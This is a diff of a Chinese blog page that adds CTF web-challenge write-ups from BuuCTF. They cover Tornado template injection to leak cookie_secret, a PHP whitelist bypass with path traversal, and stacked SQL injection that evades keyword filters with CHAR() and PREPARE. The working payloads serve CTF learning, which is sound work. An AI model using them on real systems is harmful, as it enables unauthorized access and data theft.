@@ -98,7 +98,7 @@
 			
 			
 				<i class="iconfont icon-words"></i>
-				<span class="words">1259
+				<span class="words">4456
 				</span>
 			
 		</div>
@@ -133,7 +133,7 @@
 			
 					<p>BuuCTF平台部分WebWP</p>
 <a id="more"></a>
-<h3 id="0x00-RoarCTF-Easy-Calc"><a href="#0x00-RoarCTF-Easy-Calc" class="headerlink" title="0x00 RoarCTF Easy Calc"></a>0x00 RoarCTF Easy Calc</h3><p>-RoarCTF 2019</p>
+<h3 id="0x01-Easy-Calc"><a href="#0x01-Easy-Calc" class="headerlink" title="0x01 Easy Calc"></a>0x01 Easy Calc</h3><p>-RoarCTF 2019</p>
 <p>页面是一个需要输入计算式的计算器</p>
 <p><img src="https://i.postimg.cc/d3vzLtLY/1.png" alt></p>
 <p>查看源码</p>
@@ -158,7 +158,70 @@
 
 <p>成功读取flag</p>
 <p><img src="https://i.postimg.cc/zDSs4WcX/4.png" alt></p>
-<h3 id="0x01-easy-tornado"><a href="#0x01-easy-tornado" class="headerlink" title="0x01 easy_tornado"></a>0x01 easy_tornado</h3><p>-护网杯</p>
+<h3 id="0x02-easy-tornado"><a href="#0x02-easy-tornado" class="headerlink" title="0x02 easy_tornado"></a>0x02 easy_tornado</h3><p>-护网杯</p>
+<p>访问页面，由三个文件</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">./flag.txt</span>    flag in <span class="string">/fllllllllllllag</span></span><br><span class="line"><span class="string">/welcome.txt</span>    render</span><br><span class="line"><span class="string">./hint.txt</span>    md5<span class="params">(cookie_secret+md5(filename)</span>)</span><br></pre></td></tr></table></figure>
+
+<p>查看文件时url为<code>/file?filename=/flag.txt&amp;filehash=2ef5834c444e6f95441474a46fd3af41</code>，即文件名和一串Hash值</p>
+<p>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面，只需要知道<code>cookie_secret</code>的既能访问flag</p>
+<p>测试发现存在<code>error</code>页面，格式为<code>/error?msg=Error</code>，测试下SSTI，尝试<code>/error?msg={{datetime}}</code></p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/qqcfynZx/sasfssti.png" class="lazyload"></p>
+<p>但是不知道去哪里找<code>cookie_secret</code>，参考大佬的wp，<code>cookie_secret</code>在Application对象settings属性中，可以构造payload</p>
+<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">error</span>?msg=&#123;&#123;<span class="keyword">handler</span>.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">'cookie_secret': '2e60cefe-<span class="number">4234-46</span>c1-a35b-9a1cb<span class="number">7368</span>2ca'</span><br></pre></td></tr></table></figure>
+
+<p>计算文件Hash值，脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line"> md5 = hashlib.md5() </span><br><span class="line"> md5.update(s) </span><br><span class="line"> <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line"> cookie_secret = <span class="string">'2e60cefe-4234-46c1-a35b-9a1cb73682ca'</span></span><br><span class="line"> print(md5(cookie_secret+md5(filename)))</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>filehash=2a8811b16214cf7e05579daef36e7895</code>，访问flag即可</p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/t4jcFYhB/tahisgag.png" class="lazyload"></p>
+<h3 id="0x04-WarmUp"><a href="#0x04-WarmUp" class="headerlink" title="0x04 WarmUp"></a>0x04 WarmUp</h3><p>-HCTF 2018</p>
+<p>源代码提示<code>&lt;!--source.php--&gt;</code>，访问得到源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现<code>hint.php</code>，得到提示<code>flag not here, and flag in ffffllllaaaagggg</code></p>
+<p>开头部分要求设定了<code>$page</code>,且<code>$page</code>的内容要在whiteList里。</p>
+<p><code>mb_substr($page,0,mb_strpos($page,&#39;?&#39;,&#39;?&#39;))</code>表示以?分割然后取出前面的字符串再判断值是否存在于whilelist中。</p>
+<p>接着对$page进行一次URLdecode之后，再判断一次。</p>
+<p>最后当以下三个条件同时为真时，包含file</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$_request[<span class="string">'file'</span>]不为空</span><br><span class="line"></span><br><span class="line">$_request[<span class="string">'file'</span>]是字符串</span><br><span class="line"></span><br><span class="line">上面定义的checkfile方法返回值为真</span><br></pre></td></tr></table></figure>
+
+<p>最终payload：<code>?file=source.php?/../../../../../ffffllllaaaagggg</code></p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/ZRw9xBBp/goofsf.png" class="lazyload"></p>
+<h3 id="0x05-随便注"><a href="#0x05-随便注" class="headerlink" title="0x05 随便注"></a>0x05 随便注</h3><p>-强网杯 2019</p>
+<p>堆叠注入，参考<a href="https://blog.csdn.net/qq_26406447/article/details/90643951" target="_blank" rel="noopener">SQL Injection8(堆叠注入)——强网杯2019随便注</a>和<a href="http://passingfoam.com/2019/07/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-supersqli%E4%B8%80%E9%A2%98%E4%B8%89%E8%A7%A3/" target="_blank" rel="noopener">强网杯-supersqli一题三解</a></p>
+<p>堆叠注入原理：在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会一起执行。因此这个想法也就造就了堆叠注入</p>
+<p>输入<code>1&#39;</code>，不回显，输入<code>1&#39;#</code>，正常回显，尝试<code>union select</code>联合注入时，返回一个正则过滤规则，几乎所有常用的字段都被过滤了</p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/d0gDSmHR/ssssqqq.png" class="lazyload"></p>
+<p>尝试堆叠注入，<code>1;show databases;#</code></p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/rsNms68g/ssqsq.png" class="lazyload"></p>
+<p>成功执行，查询表，<code>1&#39;;show tables;#</code>，查询出两张表</p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/cChxZQmb/ssqsasas.png" class="lazyload"></p>
+<p>分别查询两张表中的字段</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;<span class="comment">#</span></span><br><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words</span><br></pre></td></tr></table></figure>
+
+<p>发现flag字段在<code>1919810931114514表</code>中</p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/T20fKJVk/fffsq.png" class="lazyload"></p>
+<p>接下来查看flag参考了大佬wp的操作</p>
+<p>prepare语句，三个基本语法</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">EXECUTE</span> stmt_name [<span class="keyword">USING</span> @var_name [, @var_name] ...];</span><br><span class="line">  </span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure>
+
+<p>这三个语句分别的意思是:</p>
+<ol>
+<li>把预处理的语句<code>preparable_stmt</code>赋值给变量<code>stmt_name</code>。</li>
+<li>执行预处理的语句，若其中有<code>？</code>（即有空缺），则使用后面的变量来进行顺序填补</li>
+<li>取消对变量的预处理语句的赋值</li>
+</ol>
+<p>char()函数，语法<code>CHAR(N,... [USING charset])</code>，即将括号内的数字用<code>,</code>分割，而且可以使用<code>&#39;number&#39;</code>,这个时候，就会取整，依然会进行转换。但是这里要提到一点，由char函数转化出来是作为字符串处理的，因此也就导致了，即使通过这个方式组合出了绕过waf的SQL语句，也因为是字符串而无法执行。这时候就可以通过<code>PREPARE</code>来将字符串转变为合法的语句，来执行</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;;Set @test=concat(CHAR(115,101,108,101,99,116,32),CHAR(102,108,97,103,32),CHAR(102,114,111,109,32),CHAR(96),1919810931114514,CHAR(96));Prepare test from @test;execute test;#</span><br></pre></td></tr></table></figure>
+
+<p>注意，本题中使用了strstr()函数，过滤了<code>set</code>和<code>perpare</code>，使用大写绕过即可</p>
+<p>再次查询</p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/LXdQ4wQJ/doangbaigbia.png" class="lazyload"></p>
+<h3 id="0x06-EasySQL"><a href="#0x06-EasySQL" class="headerlink" title="0x06 EasySQL"></a>0x06 EasySQL</h3><p>-SUCTF 2019</p>
   	
 					
 	  </div>     
@@ -335,7 +398,9 @@
 		<div class="copyright">
 			&copy;
 			
-			2019
+			2019 -
+			
+			2020
 			SunSh1ne
 
 			<br>
